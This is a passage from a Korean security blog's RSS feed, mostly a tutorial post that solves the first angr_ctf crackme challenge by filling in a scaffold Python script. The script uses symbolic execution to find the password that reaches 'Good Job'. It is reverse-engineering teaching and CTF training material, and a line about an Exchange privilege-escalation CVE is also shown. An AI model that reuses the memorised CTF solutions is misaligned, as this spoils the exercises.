&#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xADF8; &#xD6C4; &#xC6D0;&#xD558;&#xB294; &#xC720;&#xC800;&#xB098; &#xADF8;&#xB8F9; &#xAC19;&#xC740; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/exchange/">exchange</category>
      
      <category domain="https://hackyboiz.github.io/tags/misconfiguration/">misconfiguration</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/ad/">ad</category>
      
      <category domain="https://hackyboiz.github.io/tags/schema/">schema</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2021-34470/">CVE-2021-34470</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/06/j0ker/2021-08-06/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 핵린이의 angr 정복기 - (3) angr_ctf part.1</title>
      <link>https://hackyboiz.github.io/2021/08/04/j0ker/angr_part3/</link>
      <guid>https://hackyboiz.github.io/2021/08/04/j0ker/angr_part3/</guid>
      <pubDate>Wed, 04 Aug 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#xD575;&amp;#xB9B0;&amp;#xC774;&amp;#xC758;-angr-&amp;#xC815;&amp;#xBCF5;&amp;#xAE30;-3-angr-ctf-part-1&quot;&gt;&lt;a href=&quot;#&amp;#xD575;&amp;#xB9B0;&amp;#xC774;&amp;#xC758;-angr-&amp;#</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-3-angr-ctf-part-1"><a href="#&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-3-angr-ctf-part-1" class="headerlink" title="&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (3) angr_ctf part.1"></a>&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (3) angr_ctf part.1</h1><p><img src="/2021/08/04/j0ker/angr_part3/5ij3uc.jpg" alt="angr_part3/5ij3uc.jpg"></p><h1 id="&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (1) &#xC2DC;&#xC791;</a></p><p><a href="https://hackyboiz.github.io/2021/07/21/j0ker/angr_part2/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (2) Symbolic Execution</a></p><h1 id="&#xC778;&#xC0AC;&#xB9D0;"><a href="#&#xC778;&#xC0AC;&#xB9D0;" class="headerlink" title="&#xC778;&#xC0AC;&#xB9D0;"></a>&#xC778;&#xC0AC;&#xB9D0;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. j0ker &#xC785;&#xB2C8;&#xB2E4;!</p><p>&#xC800;&#xBC88;&#xC8FC; Symbolic Execution &#xACF5;&#xBD80;&#xD558;&#xB2E4; &#xB0B4;&#xC0C1;&#xC744; &#xC785;&#xC5B4; &#xC880; &#xC26C;&#xACE0; &#xC2F6;&#xC5C8;&#xC9C0;&#xB9CC; &#xC5ED;&#xC2DC; &#xD300;&#xC5D0;&#xC11C;&#xB294; &#xC800;&#xB97C; &#xAC00;&#xB9CC;&#xD788; &#xB450;&#xC9C0; &#xC54A;&#xB124;&#xC694;. &#xC5B4;&#xB51C; &#xAC00;&#xB4E0; &#xB9C9;&#xB0B4;&#xAC00; &#xB9CE;&#xC774; &#xC6C0;&#xC9C1;&#xC5EC;&#xC57C; &#xC0AC;&#xB791;&#xBC1B;&#xB294;&#xB2E4;&#xB294;&#xB370; &#xC800;&#xB294; &#xB531;&#xD788; &#xB0A8;&#xC790;&#xB4E4;&#xC758; &#xC0AC;&#xB791;&#xC744; &#xBC1B;&#xACE0; &#xC2F6;&#xC9C0; &#xC54A;&#xC544;&#xC11C; &#xB354; &#xAC00;&#xB9CC;&#xD788; &#xC788;&#xACE0; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xADF8;&#xB7EC;&#xB2C8;&#xAE4C; &#xB450;&#xC138;&#xBC30;&#xB85C; &#xC0AC;&#xB791;(?) &#xB2F9;&#xD558;&#xACE0; &#xC788;&#xB124;&#xC694; &#xD5C8;&#xD5C8; &#xB9C9;&#xB0B4;&#xAC00; &#xB9CE;&#xC774; &#xC6C0;&#xC9C1;&#xC5EC;&#xC57C; &#xC0AC;&#xB791;&#xBC1B;&#xB294;&#xB2E4;&#xB294; &#xAC83;&#xC740; &#xB2E4; &#xAC1C;&#xBEE5;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB0E5; &#xAC00;&#xB9CC;&#xD788; &#xC788;&#xC73C;&#xC138;&#xC694;. &#xADF8;&#xB7FC; &#xB354; &#xB9CE;&#xC740; &#xC0AC;&#xB791;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;(&#xACBD;&#xD5D8;&#xB2F4;)</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xBC88;&#xC8FC;&#xC5D0;&#xB294; &#xD790;&#xB9C1;&#xD558;&#xBA74;&#xC11C; &#xACF5;&#xBD80;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC65C;&#xB0D0;&#xBA74; &#xB0B4;&#xC6A9;&#xC774; &#xC26C;&#xC6E0;&#xAC70;&#xB4E0;&#xC694;!! &#xD0BC;&#xD0BC;&#xD0BC;&#x314B;</p><p><img src="/2021/08/04/j0ker/angr_part3/1628050255.gif" alt="angr_part3/1628050255.gif"></p><p>&#xC774;&#xBC88;&#xC8FC;&#xB294; <a href="https://github.com/jakespringer/angr_ctf">angr_ctf</a>&#xC5D0; &#xC788;&#xB294; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480;&#xC5B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC04;&#xB2E8;&#xD788; &#xC124;&#xBA85;&#xD558;&#xBA74; CTF&#xC5D0; &#xB098;&#xC628; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480;&#xAE30; &#xC804;&#xC5D0; angr&#xC5D0; &#xC880; &#xB354; &#xC775;&#xC219;&#xD574;&#xC9C0;&#xAE30; &#xC704;&#xD55C; &#xD29C;&#xD1A0;&#xB9AC;&#xC5BC; &#xAC19;&#xC740; &#xBB38;&#xC81C;&#xB4E4;&#xC774;&#xB77C; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC544;&#xBB34;&#xB798;&#xB3C4; &#xC81C; 1&#xD3B8;&#xC774;&#xB098; 2&#xD3B8;&#xC744; &#xBCF4;&#xC168;&#xB354;&#xB77C;&#xB3C4; angr&#xB97C; &#xBC14;&#xB85C; &#xC368;&#xC11C; CTF &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xC218; &#xC788;&#xACA0;&#xB2E4;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xB4DC;&#xC2DC;&#xC9C4; &#xC54A;&#xC73C;&#xC168;&#xC744;&#xD150;&#xB370;&#xC694;. &#xC774; &#xBB38;&#xC81C;&#xB4E4;&#xB9CC; &#xD47C;&#xB2E4;&#xBA74; &#xC774;&#xC81C; CTF &#xBB38;&#xC81C; &#xD478;&#xB294; &#xAC83;&#xB3C4; &#xBB34;&#xB9AC;&#xAC00; &#xC5C6;&#xC5B4; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;!(&#xC544;&#xB9C8;&#xB3C4;&#x2026;) &#xC5EC;&#xB7EC;&#xBD84;&#xB3C4; &#xD480;&#xC5B4;&#xBCF4;&#xC2DC;&#xBA74;&#xC11C; &#xC800;&#xC640; &#xAC19;&#xC774; &#xD575;&#xB9B0;&#xC774;&#xB97C; &#xD0C8;&#xCD9C;&#xD574;&#xBCF4;&#xC2DC;&#xC8E0;!(&#xBC29;&#xAE08; &#xC81C; &#xBA38;&#xB9BF;&#xC18D;&#xC5D0; &#xD574;&#xD0B9;&#xC73C;&#xB85C; &#xC138;&#xACC4; &#xC815;&#xBCF5;&#xD558;&#xB294; &#xC7A5;&#xBA74;&#xC774; &#xC9C0;&#xB098;&#xAC14;&#x2026; &#xC74D;&#xC74D;)</p><p>&#xBB38;&#xC81C;&#xB97C; &#xD480;&#xAE30; &#xC804;&#xC5D0; &#xBA3C;&#xC800; angr_ctf&#xB97C; &#xD074;&#xB860;&#xD574;&#xBCF4;&#xC2DC;&#xBA74; &#xB9CE;&#xC740; &#xD3F4;&#xB354;&#xB4E4;&#xC774; &#xC788;&#xC744;&#xAC81;&#xB2C8;&#xB2E4;. &#xAC01;&#xBB38;&#xC81C; &#xBCC4;&#xB85C; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB791; &#xBB38;&#xC81C;&#xB4E4;&#xC774; &#xB4E4;&#xC5B4; &#xC788;&#xB294;&#xB370; &#xC800;&#xD76C;&#xB294; &#xC77C;&#xC77C;&#xC774; &#xCEF4;&#xD30C;&#xC77C;&#xD558;&#xAE30; &#xADC0;&#xCC2E;&#xC73C;&#xB2C8;&#xAE4C; dist &#xD3F4;&#xB354;&#xC5D0; &#xC788;&#xB294; &#xB0B4;&#xC6A9;&#xB4E4;&#xB85C; &#xC9C4;&#xD589;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. dist &#xD3F4;&#xB354;&#xC5D0;&#xB294; &#xBBF8;&#xB9AC; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; &#xBB38;&#xC81C;&#xC6A9; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xAC01;&#xAC01; &#xBC88;&#xD638;&#xB85C; &#xB9E4;&#xCE6D;&#xC774; &#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBB38;&#xC81C;&#xB9C8;&#xB2E4; &#xBC88;&#xD638;&#xC5D0; &#xB9DE;&#xB294; &#xD30C;&#xC774;&#xC36C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC5F4;&#xC5B4;&#xBCF4;&#xC2DC;&#xBA74; &#xC124;&#xBA85;&#xACFC; &#xD568;&#xAED8; &#xBB38;&#xC81C;&#xD480;&#xC774;&#xB97C; &#xC704;&#xD55C; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC2A4;&#xD2B8;&#xB9BD;&#xD2B8;&#xB97C; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xC800;&#xD76C;&#xAC00; &#xD560;&#xC77C;&#xC740; &#xADF8; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB4E4; &#xC548;&#xC5D0; &#xC9C0;&#xC6CC;&#xC838; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xB4E4;&#xC744; &#xCC44;&#xC6CC;&#xAC00;&#xBA74; &#xB418;&#xB294;&#xAC70;&#xC8E0;!</p><h1 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h1><p>0 &#xBC88;&#xC9F8; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;! &#xBC14;&#xB85C; IDA&#xB85C; &#xAE4C;&#xBCF4;&#xC8E0;.</p><p><img src="/2021/08/04/j0ker/angr_part3/Untitled.png" alt="anrgr_part3/Untitled.png"></p><p>&#xD638;&#xD638; &#xBCC4;&#xAC70; &#xC5C6;&#xB124;&#xC694;. &#xB300;&#xCDA9; &#xBCF4;&#xBA74; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xC785;&#xB825;&#xC73C;&#xB85C; 8&#xAE00;&#xC790;&#xB97C; &#xBC1B;&#xACE0; <code>complex_function</code>&#xC774;&#xB77C;&#xB294; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC774;&#xB7EC;&#xCFF5;&#xC800;&#xB7EC;&#xCFF5; &#xC791;&#xC5C5;&#xC744; &#xD55C; &#xB2E4;&#xC74C;&#xC5D0;, &#x201C;JACEJGCS&#x201D; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xBE44;&#xAD50;&#xB97C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; <code>complex_function</code>&#xC774; &#xBB58; &#xD558;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/1.png" alt="anrgr_part3/Untitled%201.png"></p><p>&#xC5EC;&#xAE30;&#xC11C;&#xB3C4; &#xBCC4;&#xAC8C; &#xC5C6;&#xB124;&#xC694;! &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xB450; &#xAC12;&#xC73C;&#xB85C; &#xC5F0;&#xC0B0;&#xC744; &#xD558;&#xACE0; &#xB05D;&#xB0A9;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xC774;&#xAC70;&#xB294; &#xC5B4;&#xCC28;&#xD53C; angr&#xAC00; &#xC54C;&#xC544;&#xC11C; &#xBD84;&#xC11D;&#xD574;&#xC904;&#xD14C;&#xB2C8;&#xAE4C; &#xADF8;&#xB0E5; &#xB118;&#xC5B4;&#xAC11;&#xC2DC;&#xB2E4;!(&#xB315;&#xAFC0;)</p><p>&#xADF8;&#xB7EC;&#xBA74; &#xC774;&#xBC88;&#xC5D0;&#xB294; scaffold00.py&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4;&#xBCFC;&#xAC8C;&#xC694;.</p><pre><code class="hljs python"><span class="hljs-comment"># Before you begin, here are a few notes about these capture-the-flag</span><span class="hljs-comment"># challenges.</span><span class="hljs-comment">#</span><span class="hljs-comment"># Each binary, when run, will ask for a password, which can be entered via stdin</span><span class="hljs-comment"># (typing it into the console.) Many of the levels will accept many different</span><span class="hljs-comment"># passwords. Your goal is to find a single password that works for each binary.</span><span class="hljs-comment">#</span><span class="hljs-comment"># If you enter an incorrect password, the program will print &quot;Try again.&quot; If you</span><span class="hljs-comment"># enter a correct password, the program will print &quot;Good Job.&quot;</span><span class="hljs-comment">#</span><span class="hljs-comment"># Each challenge will be accompanied by a file like this one, named</span><span class="hljs-comment"># &quot;scaffoldXX.py&quot;. It will offer guidance as well as the skeleton of a possible</span><span class="hljs-comment"># solution. You will have to edit each file. In some cases, you will have to</span><span class="hljs-comment"># edit it significantly. While use of these files is recommended, you can write</span><span class="hljs-comment"># a solution without them, if you find that they are too restrictive.</span><span class="hljs-comment">#</span><span class="hljs-comment"># Places in the scaffoldXX.py that require a simple substitution will be marked</span><span class="hljs-comment"># with three question marks (???). Places that require more code will be marked</span><span class="hljs-comment"># with an ellipsis (...). Comments will document any new concepts, but will be</span><span class="hljs-comment"># omitted for concepts that have already been covered (you will need to use</span><span class="hljs-comment"># previous scaffoldXX.py files as a reference to solve the challenges.) If a</span><span class="hljs-comment"># comment documents a part of the code that needs to be changed, it will be</span><span class="hljs-comment"># marked with an exclamation point at the end, on a separate line (!).</span><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  <span class="hljs-comment"># Create an Angr project.</span>  <span class="hljs-comment"># If you want to be able to point to the binary from the command line, you can</span>  <span class="hljs-comment"># use argv[1] as the parameter. Then, you can run the script from the command</span>  <span class="hljs-comment"># line as follows:</span>  <span class="hljs-comment"># python ./scaffold00.py [binary]</span>  <span class="hljs-comment"># (!)</span>  path_to_binary = ???  # :string  project = angr.Project(path_to_binary)  <span class="hljs-comment"># Tell Angr where to start executing (should it start from the main()</span>  <span class="hljs-comment"># function or somewhere else?) For now, use the entry_state function</span>  <span class="hljs-comment"># to instruct Angr to start from the main() function.</span>  initial_state = project.factory.entry_state()  <span class="hljs-comment"># Create a simulation manager initialized with the starting state. It provides</span>  <span class="hljs-comment"># a number of useful tools to search and execute the binary.</span>  simulation = project.factory.simgr(initial_state)  <span class="hljs-comment"># Explore the binary to attempt to find the address that prints &quot;Good Job.&quot;</span>  <span class="hljs-comment"># You will have to find the address you want to find and insert it here. </span>  <span class="hljs-comment"># This function will keep executing until it either finds a solution or it </span>  <span class="hljs-comment"># has explored every possible path through the executable.</span>  <span class="hljs-comment"># (!)</span>  print_good_address = ???  # :integer (probably in hexadecimal)  simulation.explore(find=print_good_address)  <span class="hljs-comment"># Check that we have found a solution. The simulation.explore() method will</span>  <span class="hljs-comment"># set simulation.found to a list of the states that it could find that reach</span>  <span class="hljs-comment"># the instruction we asked it to search for. Remember, in Python, if a list</span>  <span class="hljs-comment"># is empty, it will be evaluated as false, otherwise true.</span>  <span class="hljs-keyword">if</span> simulation.found:    <span class="hljs-comment"># The explore method stops after it finds a single state that arrives at the</span>    <span class="hljs-comment"># target address.</span>    solution_state = simulation.found[<span class="hljs-number">0</span>]&#xADF8;&#xB7EC;&#xBA70;    <span class="hljs-comment"># Print the string that Angr wrote to stdin to follow solution_state. This </span>    <span class="hljs-comment"># is our solution.</span>    <span class="hljs-keyword">print</span> solution_state.posix.dumps(sys.stdin.fileno())  <span class="hljs-keyword">else</span>:    <span class="hljs-comment"># If Angr could not find a path that reaches print_good_address, throw an</span>    <span class="hljs-comment"># error. Perhaps you mistyped the print_good_address?</span>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xC73C;&#xC73D;&#x2026; &#xC601;&#xC5B4;&#xAC00; &#xB9CE;&#xC740; &#xAC74; &#xC88B;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD55C;&#xAD6D;&#xC5B4;&#xB3C4; &#xC798; &#xBABB;&#xD558;&#xB294; &#xC0AC;&#xB78C;&#xD55C;&#xD14C; &#xC601;&#xC5B4;&#xB77C;&#xB2C8;&#x2026; &#xAC00;&#xB2F9;&#xCE58;&#xB3C4; &#xC54A;&#xC8E0;. &#xC77C;&#xB2E8; &#xC124;&#xBA85;&#xC740; &#xB2E4; &#xC5C6;&#xC560;&#xACE0; &#xC77C;&#xC77C;&#xC774; &#xBCF4;&#xBA74;&#xC11C; &#xC81C;&#xAC00; &#xC124;&#xBA85;&#xD574;&#xB4DC;&#xB9AC;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = ???  # :string  project = angr.Project(path_to_binary)    initial_state = project.factory.entry_state()  simulation = project.factory.simgr(initial_state)  print_good_address = ???  # :integer (probably in hexadecimal)  simulation.explore(find=print_good_address)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    <span class="hljs-keyword">print</span> solution_state.posix.dumps(sys.stdin.fileno())  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><p>&#xD558;&#x2026; &#xD3B8;-&#xC548;&#x2026;</p><p>&#xC77C;&#xB2E8; &#xBCF4;&#xBA74; ???&#xB77C;&#xACE0; &#xB418;&#xC5B4; &#xC788;&#xB294; &#xACF3;&#xC774; &#xB450; &#xAD70;&#xB370; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xC800; &#xBD80;&#xBD84;&#xB9CC; &#xC800;&#xD76C;&#xAC00; &#xB530;&#xB85C; &#xC791;&#xC131;&#xC744; &#xD574;&#xC8FC;&#xBA74; &#xD480; &#xC218; &#xC788;&#xC744;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">path_to_binary = ???  # :stringproject = angr.Project(path_to_binary)</code></pre><p>&#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xBA3C;&#xC800; angr&#xB97C; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xC758;&#xBBF8;&#xB85C; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xC5B4;&#xB5A4; &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xAC83;&#xC778;&#xC9C0; &#xC9C0;&#xC815;&#xC744; &#xD574;&#xC918;&#xC57C;&#xACA0;&#xC8E0;? &#xD558;&#xC9C0;&#xB9CC; &#xB9E4;&#xBC88; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0; &#xBB38;&#xC81C; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xC801;&#xC5B4;&#xC8FC;&#xB294;&#xAC74; &#xADC0;&#xCC2E;&#xC73C;&#xB2C8; &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xC544; &#xC4F0;&#xB294; &#xAC78;&#xB85C; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. <code>path_to_binary = argv[1]</code></p><pre><code class="hljs python">initial_state = project.factory.entry_state()simulation = project.factory.simgr(initial_state)</code></pre><p>&#xC774;&#xC81C; &#xBD84;&#xC11D;&#xC744; &#xC2DC;&#xC791;&#xD560; &#xBD80;&#xBD84;&#xC744; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADFC;&#xB370; &#xD2B9;&#xBCC4;&#xD55C; &#xC870;&#xAC74;&#xC774; &#xC5C6;&#xC73C;&#xB2C8; &#xADF8;&#xB0E5; &#xC5D4;&#xD2B8;&#xB9AC;&#xD3EC;&#xC778;&#xD2B8;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xC744; &#xD558;&#xB294;&#xAC8C; &#xC88B;&#xACA0;&#xC8E0;? <code>project.factory.entry_state()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC5D4;&#xD2B8;&#xB9AC;&#xD3EC;&#xC778;&#xD2B8;&#xBD80;&#xD130; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xD560; &#xC218; &#xC788;&#xAC8C; state &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; <code>full_init_state()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC5D4;&#xD2B8;&#xB9AC;&#xD3EC;&#xC778;&#xD2B8; &#xC774;&#xC804;&#xC5D0; &#xB85C;&#xB354;&#xC5D0;&#xC11C; &#xD558;&#xB294; &#xC791;&#xC5C5;&#xB4E4;, &#xCD08;&#xAE30;&#xD654; &#xD568;&#xC218;&#xB4E4;&#xAE4C;&#xC9C0; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD560; &#xC218; &#xC788;&#xB294; state&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xAE30;&#xB3C4; &#xD558;&#xACE0; <code>blank_state()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC720;&#xC800;&#xAC00; &#xB9C8;&#xC74C;&#xB300;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; state, <code>call_state()</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC9C0;&#xC815;&#xD55C; &#xC8FC;&#xC18C;&#xC5D0;&#xC11C;&#xBD80;&#xD130; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD560; &#xC218; &#xC788;&#xB294; state&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xAC70;&#xB294; &#xBB38;&#xC81C; &#xC0C1;&#xD669;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB974;&#xAC8C; &#xC124;&#xC815;&#xD558;&#xBA74; &#xB420;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>state&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xBA74; &#xC774;&#xAC78; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xC5D0; &#xB123;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB294; &#x201C;&#xC544; &#xC774; state&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC744; &#xC900;&#xBE44;&#xD558;&#xBA74; &#xB418;&#xACA0;&#xAD6C;&#xB098;&#x201D;&#xD558;&#xACE0; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC704;&#xD55C; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xB610; &#xC0DD;&#xC131;&#xD558;&#xC8E0;.</p><pre><code class="hljs python">print_good_address = ???  # :integer (probably in hexadecimal)simulation.explore(find=print_good_address)</code></pre><p>&#xC774;&#xC81C; &#xB3C4;&#xB2EC;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xC8FC;&#xC18C;&#xB97C; &#xC124;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;. <code>explore()</code>&#xC5D0;&#xC11C;&#xB294; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; &#xC870;&#xAC74;&#xC5D0; &#xB530;&#xB77C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xACE0; &#xC870;&#xAC74;&#xC5D0; &#xBD80;&#xD569;&#xD558;&#xAC70;&#xB098; &#xBD80;&#xD569;&#xD558;&#xC9C0; &#xC54A;&#xB294; state&#xB97C; &#xCC3E;&#xC544;&#xB0B4;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC778;&#xC790;&#xB85C; &#xC8FC;&#xC18C;&#xB97C; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB85C; &#xAC00;&#xB294; state&#xB97C; &#xCC3E;&#xAC70;&#xB098; &#xD53C;&#xD558;&#xACE0; &#xC2F6;&#xC740; &#xC8FC;&#xC18C;&#xAC00; &#xC788;&#xB2E4;&#xBA74; &#xADF8; &#xC8FC;&#xC18C;&#xB97C; &#xD53C;&#xD574; state&#xB97C; &#xD0D0;&#xC0C9;&#xD569;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xB294; &#x201C;Good Job&#x201D;&#xC744; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294; &#xC8FC;&#xC18C;&#xAE4C;&#xC9C0; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xC785;&#xB825;&#xAC12;&#xC744; &#xCC3E;&#xC544;&#xC57C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; find &#xC778;&#xC790; &#xAC12;&#xC73C;&#xB85C; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; &#xB118;&#xACA8;&#xC8FC;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC2DC; IDA&#xB85C; &#xB118;&#xC5B4;&#xAC00;&#xC11C; &#xBCF4;&#xBA74; &#x201C;Good Job&#x201D;&#xC744; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294; &#xBD80;&#xBD84;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/04/j0ker/angr_part3/2.png" 